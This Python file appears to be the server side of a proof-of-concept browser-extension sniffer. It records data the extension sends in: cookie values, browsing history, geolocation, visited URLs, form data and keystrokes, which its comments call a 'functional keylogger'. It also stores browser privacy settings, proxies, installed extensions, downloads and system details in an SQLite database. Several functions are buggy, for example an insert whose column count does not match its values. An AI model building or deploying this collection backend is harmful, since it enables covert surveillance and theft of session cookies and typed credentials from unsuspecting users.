import pandas as pd
import json
import sqlite3 as sql

"""
Global Variables
__file__ is a python variable that stores the global path to the .py file, therefore, 
it can be used instead of os for the global path, and then modify it for each path.
"""
#DataBase Path
a = __file__
a = a[:-6]+"logs\\"
DB_PATH = __file__[:-6]+"DB\\test.sqlite"


"""
Non_Database_Logging

All this section is just used by "/Extension".
It logs the information in separete .csv managed by pandas
It is not a real deployment, but make it easier for testing purposes of "/Extension" a littel snipet of sniffer code
First all paths are initialized, the main function restart the files.
And Log() redirect the data send by the extension to app.py and then to here to the correct
subfunction that use pandas for storing information
"""
#Files managed by pandas that stores data, used by "/Extension"
Geo_file = a + "geo.csv" 
Cks_file = a + "cookies.csv"
His_file = a + "historial.csv"
url_file = a + "URL.csv"
FD_file  = a + "Form_Data.txt"
KLg_file = a + "keylogger_inputs.csv"
#for comodity in coding, all paths where store in the files, and the str passed by app.py
#are transformed to the rigth number in a dictionary
Files = [Geo_file,Cks_file,His_file,url_file,FD_file,KLg_file]
DFiles = {"Geo": 0, "Coo": 1, "His": 2, "Url": 3, "Form": 4, "Key": 5}

def main():
    #Create the files using the paths (Used only by "/Extension")
    for i in Files:

        f = open(i, "w")
        f.close()
    #Give the format to those files for storing the json received, used only by "/Extension"
    df = pd.DataFrame(columns=["domain","sameSite","secure","value"])
    df.to_csv(Cks_file, index=False)
    df = pd.DataFrame(columns=["lat","lon"])
    df.to_csv(Geo_file, index=False)
    df = pd.DataFrame(columns=["id","lastVisitTime","title","typedCount","url","visitCount"])
    df.to_csv(His_file, index=False)
    df = pd.DataFrame(columns=["url"])
    df.to_csv(url_file, index=False)
    df = pd.DataFrame(columns=["url","fieldname","fieldvalue"])
    df.to_csv(KLg_file, index=False)


def CookiesLog(raws):
    
    """
    An Extension can obtain all the data about cookies, but the most interesting attributes are the domain,
    sameSite (if they exists outside one page), secure (if they are limited to HTTPS) and value (the unique information that they store)
    """

    f = open(Cks_file, "r+") #open the cookie csv
    lines = f.readlines()
    if len(lines) > 600: #pandas have problems managing high density csv, this produces that the last entry introduced in the last iteration is bugged, therefore, for avoiding problems, is eliminated
        #A real deployment would use a database, not a file, therefore this problem would not appear
        lines.pop()
        f = open(Cks_file, "w+")
        f.writelines(lines)
    f.close()

    raws = json.loads(raws.decode("utf-8")) 
    df = pd.read_csv(Cks_file)
    #Opens the file, move the data from the json to a order list and add the data to the dataframe
    for raw in raws:
        data = []
        data.append(raw["domain"])
        data.append(raw["sameSite"])
        data.append(raw["secure"])
        data.append(raw["value"])
        data = pd.DataFrame([data], columns=["domain","sameSite","secure","value"])
        df = df.append(data, ignore_index=True)
    df.to_csv(Cks_file, index=False) #store dataframe


def HistLog(raws):
    """
    An extension can obtain the browser history of the user and all relationed attributes, that is, the id, the last time visited,
    the title of the web, the typed count, the url of the web and the visited count.
    All important information about the tendency and likes of the user
    """
    raws = json.loads(raws.decode("utf-8"))
    df = pd.read_csv(His_file) #Opens dataframe, put the information to an ordered list, insert it in the dataframe
    for raw in raws:
        data = list(raw.values())
        data = pd.DataFrame([data], columns=["id","lastVisitTime","title","typedCount","url","visitCount"])
        df = df.append(data, ignore_index=True)
    
    df.to_csv(His_file, index=False)#store dataframe

def GeoLog(raw):
    """
    An extension can obtain the geolocation of the user, that is the latitude, longitud and accuracy of the measure. The accuracy is not recorded here
    """
    raws = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(Geo_file)#Opens dataframe, put the information to an ordered list, insert it in the dataframe
    data = []
    data.append(raws["lat"])
    data.append(raws["lon"])
    data = pd.DataFrame([data], columns=["lat","lon"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(Geo_file, index=False)    #store dataframe
    pass

def UrlLog(raw):
    """
    An extension can obtain the URL of any website the user visit. This is the same that obtaining the URL but with a differente permission
    """
    raw = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(url_file)#Opens dataframe, put the information to an ordered list, insert it in the dataframe
    data = list(raw.values())
    data = pd.DataFrame([data], columns=["url"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(url_file, index=False)    #store dataframe
    pass

def KeyLog(raw):
    """
    An extension can setup a listener for keypresses and store them, therefore creating a functional keylogger
    """
    raw = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(KLg_file)#Opens dataframe, put the information to an ordered list, insert it in the dataframe
    data = list(raw.values())
    data = pd.DataFrame([data], columns=["url","fieldname","fieldvalue"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(KLg_file, index=False)    #store dataframe
    pass

def log(file, data):
    """
    When a log is requested the first parameter is a str that indicates the type of information,
    this str is translated to a int by the Dictionary and later to the path by the list
    Then the correct function is executed
    WIP: FORM DATA
    """
    file = DFiles[file]
    file = Files[file]
    if file == Cks_file:
        CookiesLog(data)
    if file == Geo_file:
        GeoLog(data)
    if file == His_file:
        HistLog(data)
    if file == url_file:
        UrlLog(data)
    if file == KLg_file:
        KeyLog(data)
    else: 
        f = open(file, "a")
        f.write(data.decode("utf-8")+"\n")
        f.close
    pass

"""
Databases_Logging
this functions are just a bunch of variable separation from the json and Queries to the respective Tables
Each Attribute should be explain in the "/POC_Combination"
 Both Content Settings and Privacy Settings do not need to be each time reinserted, 
 there is only value in the last state of the settings, for this reason if there is already 
 an entry on those tables with the respective UID, they would update the entry
 instead of adding a new entrie

WIP:
ALL THE OTHER TABLES
"""
#Databases Loggers:

def CSDBlog(data): #ContentSettings DataBase Logger
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    plugins = data["Plugins"]
    fullScreen = data["FullScreen"]
    mouseLocks = data["MouseLock"]
    cookies = data["Cookies"]
    images = data["Images"]
    javaScript = data["JavaScript"]
    location = data["Location"]
    popups = data["Popups"]
    notifications = data["Notifications"]
    microphone = data["Microphone"]
    camera = data["Camera"]
    automaticDowloads = data["AutomaticDownloads"]
    csuid = data["uid"]
    unsandboxedPlugins = data["UnsandboxedPlugins"]
    cur.execute("SELECT * FROM  ContentSettings WHERE csuid = ?", (csuid,)) #https://stackoverflow.com/questions/16856647/sqlite3-programmingerror-incorrect-number-of-bindings-supplied-the-current-sta
    rows = cur.fetchone()
    if rows == None:
        cur.execute("""INSERT OR IGNORE INTO ContentSettings (automaticDownloads, cookies,images,javaScript,location,plugins,popups,notifications,fullScreen,mouseLocks,microphone,camera,unsandboxedPlugins,csuid) VALUES (?, ?,?, ?,?, ?,?, ?,?, ?,?, ?,?, ?)""", 
                        (automaticDowloads, cookies,images,javaScript,location,plugins,popups,notifications,fullScreen,mouseLocks,microphone,camera,unsandboxedPlugins,csuid))
    else:
       cur.execute("""UPDATE ContentSettings SET automaticDownloads = ?, cookies = ?,images = ?,javaScript =? ,location = ?, plugins = ?, popups = ?, notifications = ?, fullScreen = ?, mouseLocks = ?, microphone = ?, camera = ?, unsandboxedPlugins = ? WHERE csuid = ?;""", 
                        (automaticDowloads, cookies,images,javaScript,location,plugins,popups,notifications,fullScreen,mouseLocks,microphone,camera,unsandboxedPlugins,csuid))
 
    conn.commit()
    
    pass


def PSDBlog(data): #PrivacySettings DataBase Logger
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    alternateErrorPagesEnabledVal = data["alternateErrorPagesEnabledVal"]
    alternateErrorPagesEnabledLev = data["alternateErrorPagesEnabledLev"]
    safeBrowsingEnabledVal = data["safeBrowsingEnabledVal"]
    safeBrowsingEnabledLev = data["safeBrowsingEnabledLev"]
    hyperlinkAuditingEnabledVal = data["hyperlinkAuditingEnabledVal"]
    hyperlinkAuditingEnabledLev = data["hyperlinkAuditingEnabledLev"]
    doNotTrackEnabledVal = data["doNotTrackEnabledVal"]
    doNotTrackEnabledLev = data["doNotTrackEnabledLev"]
    protectedContentEnabledVal = data["protectedContentEnabledVal"]
    protectedContentEnabledLev = data["protectedContentEnabledLev"]
    psuid = data["uid"]

    cur.execute("SELECT * FROM  PrivacySettings WHERE psuid = ?", (psuid,)) #https://stackoverflow.com/questions/16856647/sqlite3-programmingerror-incorrect-number-of-bindings-supplied-the-current-sta
    rows = cur.fetchone()
    if rows == None:
        cur.execute("""INSERT OR IGNORE INTO PrivacySettings (alternateErrorPagesEnabledVal, alternateErrorPagesEnabledLev,safeBrowsingEnabledVal,safeBrowsingEnabledLev,hyperlinkAuditingEnabledVal,hyperlinkAuditingEnabledLev,doNotTrackEnabledVal,doNotTrackEnabledLev,protectedContentEnabledVal,protectedContentEnabledLev,psuid) VALUES (?, ?,?, ?,?, ?,?, ?,?, ?,?)""", 
                        (alternateErrorPagesEnabledVal, alternateErrorPagesEnabledLev,safeBrowsingEnabledVal,safeBrowsingEnabledLev,hyperlinkAuditingEnabledVal,hyperlinkAuditingEnabledLev,doNotTrackEnabledVal,doNotTrackEnabledLev,protectedContentEnabledVal,protectedContentEnabledLev,psuid))
    else:
       cur.execute("""UPDATE PrivacySettings SET alternateErrorPagesEnabledVal = ?, alternateErrorPagesEnabledLev = ?,safeBrowsingEnabledVal = ?,safeBrowsingEnabledLev =? ,hyperlinkAuditingEnabledVal = ?, hyperlinkAuditingEnabledLev = ?, doNotTrackEnabledVal = ?, doNotTrackEnabledLev = ?, protectedContentEnabledVal = ?, protectedContentEnabledLev = ? WHERE psuid = ?;""", 
                        (alternateErrorPagesEnabledVal, alternateErrorPagesEnabledLev,safeBrowsingEnabledVal,safeBrowsingEnabledLev,hyperlinkAuditingEnabledVal,hyperlinkAuditingEnabledLev,doNotTrackEnabledVal,doNotTrackEnabledLev,protectedContentEnabledVal,protectedContentEnabledLev,psuid))
 
    conn.commit()
    
    pass

def Xlog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Blob = data["blob"]
    uid = data["uid"]

    cur.execute("""INSERT OR IGNORE INTO PrivacySettings (Blob,uid) VALUES (?,?)""", 
                        (Blob,uid))
    conn.commit()
    
    pass

def Cookieslog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Blob = data["blob"]
    uid = data["uid"]

    cur.execute("""INSERT OR IGNORE INTO Cookies (cookies,uid) VALUES (?,?)""", 
                        (Blob,uid))
    conn.commit()
    
    pass

def HistorialLog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Blob = data["blob"]
    uid = data["uid"]

    cur.execute("""INSERT OR IGNORE INTO Historial (historie,uid) VALUES (?,?)""", 
                        (Blob,uid))
    conn.commit()
    
    pass

def Proxielog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Blob = data["blob"]
    uid = data["uid"]

    cur.execute("""INSERT OR IGNORE INTO Proxies (proxy,uid) VALUES (?,?)""", 
                        (Blob,uid))
    conn.commit()
    
    pass

def Extensionslog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Blob = data["blob"]
    uid = data["uid"]

    cur.execute("""INSERT OR IGNORE INTO PExtensions (extension,uid) VALUES (?,?)""", 
                        (Blob,uid))
    conn.commit()
    
    pass
def Downloadslog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Blob = data["blob"]
    uid = data["uid"]

    cur.execute("""INSERT OR IGNORE INTO Downloads (down,uid) VALUES (?,?)""", 
                        (Blob,uid))
    conn.commit()
    
    pass

def CPUlog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Blob = data["blob"]
    uid = data["uid"]
    
    cur.execute("SELECT * FROM  Cpus WHERE psuid = ?", (uid,)) #https://stackoverflow.com/questions/16856647/sqlite3-programmingerror-incorrect-number-of-bindings-supplied-the-current-sta
    rows = cur.fetchone()
    if rows == None:
        cur.execute("""INSERT OR IGNORE INTO Cpus (cpu,uid) VALUES (?,?)""", 
                        (Blob,uid))
    else:
        cur.execute("""UPDATE Cpus SET cpu = ? WHERE uid = ?""",
                        (Blob,uid))
    conn.commit()

    
    pass

def OSlog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Blob = data["blob"]
    uid = data["uid"]

    cur.execute("SELECT * FROM  OS WHERE psuid = ?", (uid,)) #https://stackoverflow.com/questions/16856647/sqlite3-programmingerror-incorrect-number-of-bindings-supplied-the-current-sta
    rows = cur.fetchone()
    if rows == None:
        cur.execute("""INSERT OR IGNORE INTO OS (os,uid) VALUES (?,?)""", 
                        (Blob,uid))
    else:
        cur.execute("""UPDATE OS SET os = ? WHERE uid = ?""",
                        (Blob,uid))
    conn.commit()
    
    pass

def Geolocationslog(data): #Base DataBase Logger for several loggers
    
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    Lat = data["lat"]
    Lon = data["lon"]
    uid = data["uid"]

    cur.execute("""INSERT OR IGNORE INTO Geolocations (latitude,longitude,uid) VALUES (?,?)""", 
                        (Lat,Lon,uid))
    conn.commit()
    
    pass